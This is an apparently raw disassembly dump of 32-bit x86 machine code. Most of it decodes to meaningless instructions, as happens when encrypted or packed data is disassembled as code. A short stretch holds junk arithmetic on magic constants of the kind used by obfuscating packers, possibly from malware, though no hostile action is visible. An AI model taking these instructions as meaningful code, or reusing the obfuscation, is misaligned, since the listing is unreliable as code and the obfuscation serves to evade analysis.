  4149c5:	shr    BYTE PTR [edi],1
  4149c7:	mov    eax,ds:0xeda57ca0
  4149cc:	xchg   BYTE PTR [ecx+ebx*4+0x7f],bh
  4149d0:	dec    esi
  4149d1:	ret    0x2892
  4149d4:	add    eax,0x4dc5676b
  4149d9:	lods   eax,DWORD PTR ds:[esi]
  4149da:	test   al,0x29
  4149dc:	adc    ch,cl
  4149de:	std    
  4149df:	aas    
  4149e0:	dec    ebp
  4149e1:	push   ds
  4149e2:	loopne 0x4149ef
  4149e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149e6:	mov    ds:0x6c91ad75,eax
  4149eb:	and    BYTE PTR [edx],dh
  4149ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149ee:	and    ah,bl
  4149f0:	or     eax,0xded1f425
  4149f5:	jo     0x414a75
  4149f7:	cmp    BYTE PTR [esi-0x69],ah
  4149fa:	push   ecx
  4149fb:	jno    0x414a62
  4149fd:	xlat   BYTE PTR ds:[ebx]
  4149fe:	idiv   bh
  414a00:	div    DWORD PTR [eax]
  414a02:	jecxz  0x414a2a
  414a04:	push   ss
  414a05:	int3   
  414a06:	mov    dl,0x3f
  414a08:	mov    ecx,0x8cb11606
  414a0d:	sbb    cl,BYTE PTR [ebp+0x41c8e466]
  414a13:	ja     0x4149aa
  414a15:	ins    DWORD PTR es:[edi],dx
  414a16:	jl     0x414a53
  414a18:	fist   WORD PTR [eax+0x5d108c21]
  414a1e:	shl    DWORD PTR [ebx-0x4a06147e],cl
  414a24:	sbb    al,0xdb
  414a26:	gs (bad) 
  414a28:	xchg   esi,eax
  414a29:	(bad)  
  414a2a:	dec    ecx
  414a2b:	pop    eax
  414a2c:	cmp    eax,0xe582f350
  414a31:	fst    DWORD PTR [ebp+0x64]
  414a34:	rcr    ch,cl
  414a36:	dec    eax
  414a37:	aaa    
  414a38:	mov    DWORD PTR [edx+0x56],esp
  414a3b:	or     eax,DWORD PTR [ebx-0x53]
  414a3e:	int3   
  414a3f:	or     edi,DWORD PTR ds:[edx]
  414a42:	in     al,dx
  414a43:	fs cdq 
  414a45:	push   DWORD PTR [edx+0x7b]
  414a48:	sbb    al,bh
  414a4a:	push   0x7d
  414a4c:	pop    esi
  414a4d:	scas   al,BYTE PTR es:[edi]
  414a4e:	mov    esp,DWORD PTR [edx]
  414a50:	call   0x94dd:0xe6360cd4
  414a57:	mov    ds:0x70dc87e3,al
  414a5c:	adc    al,BYTE PTR [ebp-0x72b5e31f]
  414a62:	push   ebx
  414a63:	pop    ds
  414a64:	mov    eax,0xae34697f
  414a69:	in     eax,0xe1
  414a6b:	cs int 0xe1
  414a6e:	sub    eax,0x6adeb0c
  414a73:	pop    eax
  414a74:	push   ss
  414a75:	stos   BYTE PTR es:[edi],al
  414a76:	push   ds
  414a77:	add    BYTE PTR [eax+0x1d],ah
  414a7a:	or     DWORD PTR [ecx+edi*2-0x75ea6539],ebp
  414a81:	xchg   ebx,eax
  414a82:	or     al,0x46
  414a84:	mov    edx,0x4ce3c987
  414a89:	mov    esp,ebx
  414a8b:	mov    ds,esi
  414a8d:	ss test eax,0x45372011
  414a93:	cmp    al,0x1f
  414a95:	pushf  
  414a96:	xor    edx,DWORD PTR [ebx+ecx*8-0x3b75164c]
  414a9d:	out    dx,eax
  414a9e:	mov    ?,WORD PTR [esi+0x1f]
  414aa1:	loopne 0x414b18
  414aa3:	(bad)  
  414aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aa5:	call   0x5fd1f6e7
  414aaa:	inc    ebx
  414aab:	xchg   ebx,eax
  414aac:	sub    edx,DWORD PTR [ecx+0x50b5a729]
  414ab2:	fsubr  QWORD PTR [edi-0x47e871e7]
  414ab8:	mov    edi,0x7394c00
  414abd:	into   
  414abe:	std    
  414abf:	sbb    esp,esi
  414ac1:	es int3 
  414ac3:	xchg   edi,eax
  414ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac5:	js     0x414b1b
  414ac7:	xchg   ecx,eax
  414ac8:	jg     0x414b18
  414aca:	jl     0x414acc
  414acc:	inc    edx
  414acd:	sub    al,BYTE PTR [ebx]
  414acf:	fdiv   DWORD PTR [edx+edi*4-0x675ef4d1]
  414ad6:	gs inc ebx
  414ad8:	jb     0x414b04
  414ada:	push   ebx
  414adb:	push   0xe23b4ef8
  414ae0:	add    BYTE PTR [ecx+0xc],0xaa
  414ae4:	lods   eax,DWORD PTR ds:[esi]
  414ae5:	ss in  al,dx
  414ae7:	rcr    DWORD PTR [ebx+0x59bdf514],cl
  414aed:	jne    0x414b4b
  414aef:	mov    bl,0x21
  414af1:	pop    ecx
  414af2:	pop    ss
  414af3:	leave  
  414af4:	mov    ah,0x41
  414af6:	arpl   WORD PTR [edx+0x54],di
  414af9:	pop    esp
  414afa:	int    0x4b
  414afc:	inc    esi
  414afd:	push   ebp
  414afe:	pop    edx
  414aff:	xor    bh,bl
  414b01:	mov    BYTE PTR [eax+eiz*1-0x66ee8456],ah
  414b08:	stos   BYTE PTR es:[edi],al
  414b09:	int3   
  414b0a:	dec    edi
  414b0b:	shl    DWORD PTR [esi+0x58d5cdfb],0x18
  414b12:	add    BYTE PTR [ebx+eax*1],dl
  414b15:	xor    al,0x8c
  414b17:	jb     0x414aed
  414b19:	repz or al,0x51
  414b1c:	es gs push esi
  414b1f:	imul   edx,DWORD PTR [edi-0x5],0x14b7dbb0
  414b26:	rol    BYTE PTR [esi+0x21],0xe5
  414b2a:	js     0x414b79
  414b2c:	icebp  
  414b2d:	sbb    BYTE PTR [edx+0xd],bh
  414b30:	xor    ch,BYTE PTR ds:0x895bd0ba
  414b36:	add    eax,0x8940519d
  414b3b:	cdq    
  414b3c:	mov    ds:0x6be8345d,eax
  414b41:	cwde   
  414b42:	inc    ecx
  414b43:	jbe    0x414aee
  414b45:	sub    al,bl
  414b47:	push   esi
  414b48:	mov    ch,0xc4
  414b4a:	sub    ebp,DWORD PTR [ecx]
  414b4c:	js     0x414af9
  414b4e:	jae    0x414b66
  414b50:	popf   
  414b51:	dec    esi
  414b52:	popa   
  414b53:	inc    eax
  414b54:	push   0x9a69ed24
  414b59:	pop    esi
  414b5a:	dec    ecx
  414b5b:	inc    edi
  414b5c:	or     eax,0xc6cbb85f
  414b61:	ins    BYTE PTR es:[edi],dx
  414b62:	cli    
  414b63:	sbb    DWORD PTR [eax+esi*8+0x70],eax
  414b67:	(bad)  
  414b68:	not    DWORD PTR [edi]
  414b6a:	jge    0x414be4
  414b6c:	jmp    0x414ba7
  414b6e:	and    DWORD PTR [edx],eax
  414b70:	out    dx,al
  414b71:	xchg   esp,eax
  414b72:	xchg   ecx,eax
  414b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b74:	mov    bl,al
  414b76:	lods   eax,DWORD PTR ds:[esi]
  414b77:	adc    al,0x2c
  414b79:	jns    0x414b3c
  414b7b:	push   edx
  414b7c:	fstp   QWORD PTR [ebp+ecx*8-0x33f89d29]
  414b83:	int3   
  414b84:	mov    esp,DWORD PTR [edx-0x23]
  414b87:	clc    
  414b88:	fld    DWORD PTR ds:0xbef91ba5
  414b8e:	mov    ecx,0x79418c08
  414b93:	ds in  eax,0xf7
  414b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b97:	lods   eax,DWORD PTR ds:[esi]
  414b98:	imul   esp,DWORD PTR [edi+0x77272d56],0x49
  414b9f:	sahf   
  414ba0:	daa    
  414ba1:	and    DWORD PTR ds:0x5d54cddd,esp
  414ba7:	add    DWORD PTR [ecx-0x4ac06460],edx
  414bad:	lea    ecx,[ebp-0x74]
  414bb0:	clc    
  414bb1:	mov    ah,0x97
  414bb3:	sbb    al,BYTE PTR [ecx-0x7a8d9b9b]
  414bb9:	pop    eax
  414bba:	sub    ebp,DWORD PTR [edi]
  414bbc:	sub    eax,DWORD PTR [esi]
  414bbe:	dec    ebx
  414bbf:	fisttp WORD PTR [ebp-0xf]
  414bc2:	push   cs
  414bc3:	aad    0x38
  414bc5:	ds stos DWORD PTR es:[edi],eax
  414bc7:	loopne 0x414b7b
  414bc9:	(bad)  
  414bca:	push   ds
  414bcb:	cmc    
  414bcc:	jecxz  0x414bf3
  414bce:	sbb    eax,0xc4300a80
  414bd3:	xor    ch,ah
  414bd5:	and    BYTE PTR [eax],0xe1
  414bd8:	out    dx,eax
  414bd9:	cmp    cl,BYTE PTR [ebx+eax*2]
  414bdc:	sti    
  414bdd:	hlt    
  414bde:	pushf  
  414bdf:	sbb    al,0xa5
  414be1:	imul   ecx,edx,0xffffffc4
  414be4:	jno    0x414bf0
  414be6:	enter  0x2218,0xce
  414bea:	mov    BYTE PTR [edi-0x1f],0x4c
  414bee:	clc    
  414bef:	jno    0x414bb2
  414bf1:	aaa    
  414bf2:	pop    esp
  414bf3:	adc    cl,BYTE PTR ds:0x3acbb853
  414bf9:	into   
  414bfa:	das    
  414bfb:	imul   ecx,DWORD PTR [ecx+0x5a],0xd82fee2a
  414c02:	pop    esp
  414c03:	mov    dh,0x55
  414c05:	cld    
  414c06:	xor    BYTE PTR [ebx+edx*2-0x64],al
  414c0a:	rcl    ah,0xcb
  414c0d:	mov    edi,0x1f43194
  414c12:	or     cl,dh
  414c14:	adc    DWORD PTR [esi-0x1],ebp
  414c17:	das    
  414c18:	(bad)  
  414c1a:	imul   ecx,DWORD PTR [edx-0x41143e9],0x41
  414c21:	pop    eax
  414c22:	xchg   esp,eax
  414c23:	loop   0x414c1c
  414c25:	mov    cl,BYTE PTR [ebx+eax*8-0x2c88c731]
  414c2c:	pop    esp
  414c2d:	xor    DWORD PTR [eax-0x1bc01559],ecx
  414c33:	call   0x7619:0xdde67892
  414c3a:	or     edx,DWORD PTR [eax-0x52a6332]
  414c40:	push   ecx
  414c41:	pop    esi
  414c42:	add    ecx,ecx
  414c44:	push   ebp
  414c45:	outs   dx,DWORD PTR ds:[esi]
  414c46:	int3   
  414c47:	xchg   DWORD PTR [edx-0x4b],esp
  414c4a:	xchg   ebx,eax
  414c4b:	mov    eax,0x410885d1
  414c50:	mov    bh,0x66
  414c52:	rcr    DWORD PTR [edx+edi*1+0x4f1d546d],1
  414c59:	popa   
  414c5a:	jmp    0x3bf7a05f
  414c5f:	xchg   edi,eax
  414c60:	pop    ds
  414c61:	cmp    eax,0x63019f98
  414c66:	mov    ebx,0xad24d950
  414c6b:	jne    0x414cd2
  414c6d:	jmp    DWORD PTR [ecx]
  414c6f:	inc    ebp
  414c70:	sub    al,0x19
  414c72:	lds    ebx,FWORD PTR [ebp+0x1d]
  414c75:	nop
  414c76:	inc    esp
  414c77:	pushf  
  414c78:	sahf   
  414c79:	xor    al,BYTE PTR [edx-0x14]
  414c7c:	je     0x414c6d
  414c7e:	sahf   
  414c7f:	das    
  414c80:	or     DWORD PTR [edx+eax*8],ebp
  414c83:	stos   DWORD PTR es:[edi],eax
  414c84:	xchg   ebp,eax
  414c85:	aad    0x94
  414c87:	inc    eax
  414c88:	out    dx,eax
  414c89:	cmp    al,al
  414c8b:	jmp    0x414cb0
  414c8d:	arpl   WORD PTR [edi-0x7251dc83],dx
  414c93:	fistp  DWORD PTR [ebx+0xffa29ae]
  414c99:	sbb    BYTE PTR [edx],bh
  414c9b:	cli    
  414c9c:	xchg   ecx,eax
  414c9d:	int3   
  414c9e:	cmp    bh,BYTE PTR [eax-0x3c]
  414ca1:	xor    esp,eax
  414ca3:	sub    eax,0x58490160
  414ca8:	pusha  
  414ca9:	dec    ecx
  414caa:	pusha  
  414cab:	cs cmp al,0x6f
  414cae:	and    eax,0x9b2250b8
  414cb3:	adc    ebp,DWORD PTR cs:[eax]
  414cb6:	jle    0x414cd3
  414cb8:	xchg   edi,eax
  414cb9:	xchg   ebx,eax
  414cba:	push   ds
  414cbb:	add    DWORD PTR [eax-0x434ceef2],0x29d359f8
  414cc5:	aaa    
  414cc6:	pusha  
  414cc7:	ins    DWORD PTR es:[edi],dx
  414cc8:	sub    eax,0x6afe38a9
  414ccd:	xor    BYTE PTR [edx+0x10c70bda],ch
  414cd3:	sbb    al,0x54
  414cd5:	imul   ebx,DWORD PTR [ecx+0x32],0x7d4af880
  414cdc:	inc    esi
  414cdd:	mov    ecx,0xa91b7e86
  414ce2:	pop    edi
  414ce3:	int3   
  414ce4:	sub    ch,dh
  414ce6:	cmp    esp,0xe1c5a5ab
  414cec:	dec    esi
  414ced:	in     eax,dx
  414cee:	loopne 0x414ccf
  414cf0:	pushf  
  414cf1:	loopne 0x414d18
  414cf3:	sub    eax,DWORD PTR [ecx+edi*2+0x69]
  414cf7:	stc    
  414cf8:	int    0xd3
  414cfa:	pop    ecx
  414cfb:	mov    al,ds:0x142d8ed3
  414d00:	dec    DWORD PTR [edi]
  414d02:	jno    0x414d69
  414d04:	push   ecx
  414d05:	ds js  0x414d6c
  414d08:	add    eax,0x90b9186c
  414d0d:	lock loop 0x414cc0
  414d10:	and    al,0xc1
  414d12:	loope  0x414ce7
  414d14:	rol    BYTE PTR ds:0x1f855e93,cl
  414d1a:	fidivr DWORD PTR [ebx-0x19]
  414d1d:	aad    0x18
  414d1f:	xor    cl,dl
  414d21:	pop    esp
  414d22:	inc    esi
  414d23:	iret   
  414d24:	cld    
  414d25:	xor    al,0x0
  414d27:	dec    ebx
  414d28:	add    eax,DWORD PTR [ecx-0x7d1c4c56]
  414d2e:	repnz add edi,DWORD PTR [ebp+0x425d3a61]
  414d35:	or     esp,DWORD PTR ds:0xcc4d0ad5
  414d3b:	and    BYTE PTR [edi-0x3bb1eeab],dh
  414d41:	ins    DWORD PTR es:[edi],dx
  414d42:	out    0x55,al
  414d44:	ret    0x12df
  414d47:	mov    ds:0x8bc10377,eax
  414d4c:	dec    ebp
  414d4d:	or     BYTE PTR [ebx],al
  414d4f:	enter  0x4d89,0x8
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0xb6
  414e02:	jae    0x414ddb
  414e04:	mov    esp,0x18161642
  414e09:	xchg   edx,eax
  414e0a:	adc    bl,BYTE PTR [eax]
  414e0c:	sbb    BYTE PTR [ecx+0x78],cl
  414e0f:	adc    esp,ecx
  414e11:	js     0x414dcd
  414e13:	inc    edi
  414e14:	dec    esp
  414e15:	stc    
  414e16:	je     0x414e68
  414e18:	xor    ecx,DWORD PTR [edx+0x4e9de532]
  414e1e:	call   0x7932:0xb372cad8
  414e25:	adc    al,0xf7
  414e27:	mov    ebx,gs
  414e29:	aad    0xcf
  414e2b:	les    esi,FWORD PTR [ebx-0x7050e127]
  414e31:	jne    0x414dea
  414e33:	add    edi,ebx
  414e35:	leave  
  414e36:	xchg   DWORD PTR ss:[ecx+edx*1+0x3e],esi
  414e3b:	or     BYTE PTR ds:0xdc80932b,dh
  414e41:	and    BYTE PTR [edx-0x784dd102],dh
  414e47:	pusha  
  414e48:	mov    bl,0x7
  414e4a:	das    
  414e4b:	push   ss
  414e4c:	cmp    eax,DWORD PTR [edx]
  414e4e:	fist   WORD PTR [ecx+0x21a62837]
  414e54:	gs push es
  414e56:	inc    ebp
  414e57:	rcl    BYTE PTR [si-0x47d5],cl
  414e5c:	lds    esi,FWORD PTR [ebp+0x2]
  414e5f:	arpl   ax,dx
  414e61:	call   0x2cdd6e9c
  414e66:	pop    edx
  414e67:	fnstenv [ebx+0x60]
  414e6a:	dec    ebx
  414e6b:	dec    eax
  414e6c:	xor    edi,DWORD PTR [edx-0x41]
  414e6f:	inc    ecx
  414e70:	cwde   
  414e71:	rcr    DWORD PTR [eax],cl
  414e73:	scas   eax,DWORD PTR es:[edi]
  414e74:	call   0xadd1:0x7a5d
  414e7a:	shl    ah,cl
  414e7c:	and    BYTE PTR [edi-0x36],0x21
  414e80:	js     0x414e33
  414e82:	(bad)  
  414e83:	(bad)  
  414e85:	lods   eax,DWORD PTR ds:[esi]
  414e86:	add    eax,0x69eb1956
  414e8b:	pushf  
  414e8c:	sti    
  414e8d:	loopne 0x414f07
  414e8f:	out    dx,al
  414e90:	pushf  
  414e91:	add    DWORD PTR [ecx+0x53],0x6509f098
  414e98:	sub    BYTE PTR [eax+0x7659f41f],ah
  414e9e:	jne    0x414e61
  414ea0:	xchg   ebx,eax
  414ea1:	imul   edx,DWORD PTR [ebp+0x22],0x7f
  414ea5:	cmp    BYTE PTR [ecx],0xff
  414ea8:	or     edi,ebx
  414eaa:	inc    ebp
  414eab:	xchg   ch,bh
  414ead:	call   0x73cfa003
  414eb2:	sub    eax,0xdbc82774
  414eb7:	cmp    ch,ah
  414eb9:	sahf   
  414eba:	jbe    0x414f24
  414ebc:	cs lock (bad) 
  414ebf:	jmp    0xde95:0xdb1692ec
  414ec6:	push   ecx
  414ec7:	sub    cl,BYTE PTR [ebx]
  414ec9:	and    al,0xe0
  414ecb:	mov    ch,0xba
  414ecd:	mul    BYTE PTR [edx+0x1a]
  414ed0:	vmread DWORD PTR [eax],ecx
  414ed3:	push   esi
  414ed4:	jne    0x414ec3
  414ed6:	loope  0x414e6b
  414ed8:	jmp    0x6ed45f7c
  414edd:	cmp    bh,cl
  414edf:	ja     0x414e96
  414ee1:	ret    
  414ee2:	pushf  
  414ee3:	xchg   ch,bl
  414ee5:	cdq    
  414ee6:	int3   
  414ee7:	inc    ecx
  414ee8:	jl     0x414f1f
  414eea:	mov    cl,0xc1
  414eec:	mov    bl,0xea
  414eee:	inc    edi
  414eef:	pop    esi
  414ef0:	cmp    BYTE PTR [ebp-0x41],ch
  414ef3:	sti    
  414ef4:	add    ebx,DWORD PTR [ebp-0x10]
  414ef7:	(bad)  
  414ef8:	adc    bl,BYTE PTR [esi+0x1a]
  414efb:	push   esi
  414efc:	adc    eax,0x1088690e
  414f01:	imul   ebp,DWORD PTR [ebx+0x26],0x32
  414f05:	int3   
  414f06:	std    
  414f07:	clc    
  414f08:	fnstsw WORD PTR [edi-0x5913b5f8]
  414f0e:	sbb    al,0x8c
  414f10:	imul   ecx,DWORD PTR [esi+0x45ba17f7],0x8a9e7e86
  414f1a:	mov    cl,BYTE PTR [esi+0x7d]
  414f1d:	xchg   edx,eax
  414f1e:	push   ecx
  414f20:	ins    BYTE PTR es:[edi],dx
  414f21:	fs test al,0x6d
  414f24:	pop    edx
  414f25:	xlat   BYTE PTR ds:[ebx]
  414f26:	mov    ebp,0x231cffe7
  414f2b:	rcr    BYTE PTR [ecx+0xe],0x3d
  414f2f:	jmp    0xe52a502f
  414f34:	mov    edx,0x9d2d0936
  414f39:	div    ecx
  414f3b:	or     al,0xdf
  414f3d:	pop    edi
  414f3e:	or     ebx,esp
  414f40:	vpcomub xmm1,xmm6,XMMWORD PTR [ebx+0x14],0x7b
  414f47:	nop
  414f48:	sub    DWORD PTR [esi],0xffffff80
  414f4b:	xchg   ebx,eax
  414f4c:	xlat   BYTE PTR ds:[ebx]
  414f4d:	ja     0x414f2e
  414f4f:	dec    esp
  414f50:	push   esp
  414f51:	repz add eax,0x51afd276
  414f57:	test   eax,0x5567d506
  414f5c:	es mov dh,0xde
  414f5f:	and    edi,ecx
  414f61:	(bad)  
  414f62:	bound  edx,QWORD PTR [ecx-0x3c39fea]
  414f68:	push   eax
  414f69:	dec    ebp
  414f6a:	inc    ebx
  414f6b:	add    ecx,DWORD PTR ds:0x57de41f0
  414f71:	pop    ds
  414f72:	int3   
  414f73:	pushf  
  414f74:	add    bh,cl
  414f76:	ret    0xda3a
  414f79:	(bad)  
  414f7a:	in     eax,dx
  414f7b:	sub    BYTE PTR [ebx],0x73
  414f7e:	(bad)  
  414f7f:	sub    eax,0xfbcf5b5
  414f84:	pop    edx
  414f85:	ret    0x437c
  414f88:	push   esi
  414f89:	bound  eax,QWORD PTR [edx]
  414f8b:	frstor [ebx-0x4410b517]
  414f91:	dec    esp
  414f92:	mov    bh,0xd5
  414f94:	into   
  414f95:	out    dx,eax
  414f96:	sbb    DWORD PTR [edx+0x6755456e],edi
  414f9c:	ror    BYTE PTR [ebx-0x10],cl
  414f9f:	call   0x7facf5b7
  414fa4:	fwait
  414fa5:	and    ebp,DWORD PTR [esi]
  414fa7:	hlt    
  414fa8:	lds    esp,FWORD PTR [esi-0x43]
  414fab:	fcmove st,st(4)
  414fad:	aaa    
  414fae:	std    
  414faf:	sub    eax,0x14b71807
  414fb4:	sbb    DWORD PTR [edx+0x3032455],esp
  414fba:	ror    edx,0xbc
  414fbd:	cwde   
  414fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fbf:	ins    BYTE PTR es:[edi],dx
  414fc0:	adc    DWORD PTR [edi+0x7fad00b6],ecx
  414fc6:	cli    
  414fc7:	enter  0xcc,0xee
  414fcb:	outs   dx,DWORD PTR ds:[esi]
  414fcc:	imul   bp,WORD PTR [edi],0xff9c
  414fd0:	mov    bh,0x74
  414fd2:	jmp    0x414fdd
  414fd4:	into   
  414fd5:	repnz or ebx,edx
  414fd8:	jmp    0x414ff9
  414fda:	cmp    bl,cl
  414fdc:	jmp    0x415037
  414fde:	lods   al,BYTE PTR ds:[esi]
  414fdf:	sub    al,bh
  414fe1:	push   esi
  414fe2:	imul   edi,ebx,0xffffffd9
  414fe5:	aas    
  414fe6:	aam    0x28
  414fe8:	jmp    0x414f89
  414fea:	aad    0xe5
  414fec:	mov    ah,0xb
  414fee:	loope  0x414fde
  414ff0:	sub    dh,BYTE PTR ds:0xeff497c1
  414ff6:	mov    DWORD PTR [ecx],ecx
  414ff8:	int    0x5c
  414ffa:	xchg   esp,eax
  414ffb:	mov    ds:0xb30ef01e,eax
  415000:	outs   dx,DWORD PTR ds:[esi]
  415001:	dec    esi
  415002:	sahf   
  415003:	mov    ch,0x16
  415005:	data16 ss hlt 
  415008:	xor    ah,ah
  41500a:	push   0xffffffa0
  41500c:	sbb    al,0x19
  41500e:	add    DWORD PTR [ebx],ebx
  415010:	xor    eax,DWORD PTR [esi+0x77]
  415013:	jl     0x414ff3
  415015:	test   DWORD PTR [edx],ebx
  415017:	popf   
  415018:	xchg   esp,eax
  415019:	mov    ds:0x9121f925,al
  41501e:	es in  eax,0x65
  415021:	pop    esp
  415022:	jae    0x41502e
  415024:	xor    BYTE PTR [ebx-0x53d5556b],dh
  41502a:	add    BYTE PTR [eax],dh
  41502c:	aaa    
  41502d:	xchg   edx,eax
  41502e:	mov    ebp,0x26595d2d
  415033:	aaa    
  415034:	mov    dl,0xd1
  415036:	stos   DWORD PTR es:[edi],eax
  415037:	es ret 0xa0ec
  41503b:	out    dx,eax
  41503c:	not    BYTE PTR [ecx+0x7ead8f59]
  415042:	add    DWORD PTR [edx+0x5ff6bcf7],esp
  415048:	or     esi,DWORD PTR [esi-0x16d356ff]
  41504e:	out    0x95,eax
  415050:	arpl   WORD PTR [ebp-0x20],si
  415053:	lea    edx,[eax-0x2dd6a8c1]
  415059:	icebp  
  41505a:	sub    eax,0xbbb786e
  41505f:	xor    BYTE PTR [esi+esi*8],bl
  415062:	inc    edx
  415063:	imul   ebp,DWORD PTR [ecx-0x65],0xdc866bdd
  41506a:	inc    eax
  41506b:	mov    al,0xb1
  41506d:	cmp    bl,0x74
  415070:	push   ebx
  415071:	test   BYTE PTR [edi+0x15],dh
  415074:	sub    al,0xc3
  415076:	mov    cl,0x8c
  415078:	rcl    DWORD PTR [esi+0xb],cl
  41507b:	ja     0x4150fc
  41507d:	lea    ecx,[eax-0x7c]
  415080:	sbb    eax,0x59250400
  415085:	js     0x415059
  415087:	hlt    
  415088:	cmp    ah,bl
  41508a:	addr16 xchg esp,ebx
  41508d:	jnp    0x41503e
  41508f:	lds    ecx,FWORD PTR [esi-0x1020725f]
  415095:	outs   dx,BYTE PTR ds:[esi]
  415096:	push   ebx
  415097:	add    al,dh
  415099:	(bad)
  41509c:	inc    cl
  41509e:	jae    0x415074
  4150a0:	int3   
  4150a1:	ds push edx
  4150a3:	and    eax,0x2291a3af
  4150a8:	sahf   
  4150a9:	jecxz  0x4150d5
  4150ab:	sti    
  4150ac:	push   esi
  4150ad:	mov    al,ds:0x794b6be7
  4150b2:	mov    ch,0xd3
  4150b4:	stc    
  4150b5:	fcomp  QWORD PTR [ebx]
  4150b7:	sub    DWORD PTR [edx-0x1ea806a9],ecx
  4150bd:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4150bf:	xchg   edi,eax
  4150c0:	or     bh,BYTE PTR [ebp-0x694610af]
  4150c6:	or     ch,BYTE PTR [ecx]
  4150c8:	pop    eax
  4150c9:	dec    esp
  4150ca:	sar    BYTE PTR [ebx],1
  4150cc:	mov    ah,0xe7
  4150ce:	xchg   BYTE PTR [edx],bh
  4150d0:	sbb    edi,DWORD PTR [edx+0xd8b870e]
  4150d6:	cmp    al,0xb8
  4150d8:	and    cl,bl
  4150da:	clc    
  4150db:	sub    ecx,0xda1b91bc
  4150e1:	xor    bh,ah
  4150e3:	or     DWORD PTR [ebx-0x61],0xd
  4150e7:	mov    eax,0x6dadcc3b
  4150ec:	mov    dl,0x5d
  4150ee:	gs dec ebp
  4150f0:	cli    
  4150f1:	(bad)  
  4150f2:	js     0x415135
  4150f4:	leave  
  4150f5:	lods   eax,DWORD PTR ds:[esi]
  4150f6:	push   esi
  4150f7:	or     esp,ebx
  4150f9:	push   0x4d
  4150fb:	add    ah,cl
  4150fd:	icebp  
  4150fe:	das    
  4150ff:	jne    0x415084
  415101:	les    edx,FWORD PTR cs:[edi-0x63]
  415105:	daa    
  415106:	std    
  415107:	adc    edx,ebp
  415109:	cli    
  41510a:	or     eax,0x4efe93bb
  41510f:	pop    esi
  415110:	push   esp
  415111:	jmp    0x4150b7
  415113:	xlat   BYTE PTR ds:[ebx]
  415114:	mov    edx,?
  415116:	jmp    0x9f34:0x94aedd11
  41511d:	ins    BYTE PTR es:[edi],dx
  41511e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41511f:	adc    eax,0x10cd16f0
  415124:	retf   
  415125:	loope  0x4150ab
  415127:	cdq    
  415128:	adc    dl,BYTE PTR [eax-0x359fa43f]
  41512e:	mov    ch,0xc3
  415130:	js     0x4151a1
  415132:	(bad)  
  415133:	fist   DWORD PTR [edi+esi*4]
  415136:	inc    eax
  415137:	mov    al,0x8e
  415139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41513a:	les    ebx,FWORD PTR [ecx+0x64]
  41513d:	ja     0x41518a
  41513f:	iret   
  415140:	add    al,0x81
  415142:	or     BYTE PTR [eax+ecx*1-0x1e],ah
  415146:	(bad)  [ebp-0x54]
  415149:	call   0xc02d:0xcd957978
  415150:	in     eax,dx
  415151:	push   eax
  415152:	pop    edx
  415153:	hlt    
  415154:	xchg   esi,eax
  415155:	jb     0x415191
  415157:	jl     0x415169
  415159:	icebp  
  41515a:	adc    BYTE PTR [ebp-0x45],cl
  41515d:	(bad)  
  41515e:	rcl    DWORD PTR [ecx-0x58],0x97
  415162:	iret   
  415163:	sti    
  415164:	sbb    BYTE PTR [ebp+0x3b],dh
  415167:	lock mov ecx,0x8d655f06
  41516d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41516e:	push   ss
  41516f:	mov    ecx,0xba34bd28
  415174:	in     eax,0x7a
  415176:	test   DWORD PTR [ebp+0x6ec1c31f],edx
  41517c:	push   ds
  41517d:	jae    0x41511f
  41517f:	call   0x76dd:0xe173b4a1
  415186:	mov    esi,0xa9e682ac
  41518b:	mov    dh,0xa6
  41518d:	in     eax,0x35
  41518f:	mov    ch,0x26
  415191:	push   cs
  415192:	mov    ebp,0x3b05394c
  415197:	lock jb 0x41520b
  41519a:	sub    al,BYTE PTR [edi-0x5ffceb49]
  4151a0:	sub    DWORD PTR [esi],0xc64df9c6
